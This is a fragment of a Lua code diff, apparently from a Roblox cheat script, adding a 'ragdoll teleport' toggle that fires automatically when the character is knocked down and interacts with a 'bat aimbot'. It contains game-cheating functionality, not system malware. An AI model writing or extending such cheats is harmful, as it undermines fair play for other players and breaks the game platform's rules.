+    if RagdollTP.RightEnabled then
+        RagdollTP.LeftEnabled = false
+        if M.autoBatEnabled and M.stopBatAimbot then M.stopBatAimbot() end
+    end
+    return RagdollTP.RightEnabled
+end
+
+function M.stopRagdollTP()
+    RagdollTP.LeftEnabled = false
+    RagdollTP.RightEnabled = false
+    RagdollTP.Teleporting = false
+end
+
+M.ragdollTPState = RagdollTP
+function M.getRagdollTPMode()
+    if RagdollTP.LeftEnabled then return "Left" end
+    if RagdollTP.RightEnabled then return "Right" end
+    return "Off"
+end
+if M._savedRagdollTPMode == "Left" then
+    M.ragdollTPLeft(true)
+elseif M._savedRagdollTPMode == "Right" then
+    M.ragdollTPRight(true)
+end
+if M.setRagdollTPUI then M.setRagdollTPUI(M.getRagdollTPMode()) end
+
+M._ragdollTPConn = RunService.Heartbeat:Connect(function()
+    local char = player.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    local state = hum:GetState()
+    local ragdolled = state == Enum.HumanoidStateType.Physics
+        or state == Enum.HumanoidStateType.Ragdoll
+        or state == Enum.HumanoidStateType.FallingDown
+    if not ragdolled then
+        RagdollTP.Recovered = true
+        return
+    end
+    if not RagdollTP.Teleporting and RagdollTP.Recovered then
+        if RagdollTP.LeftEnabled then
+            task.spawn(executeRagdollTP, "Left")
+        elseif RagdollTP.RightEnabled then
+            task.spawn(executeRagdollTP, "Right")
+        end
+    end
+end)
 
 -- Ativação única depois de todo o ONI estar carregado.
 task.defer(function()
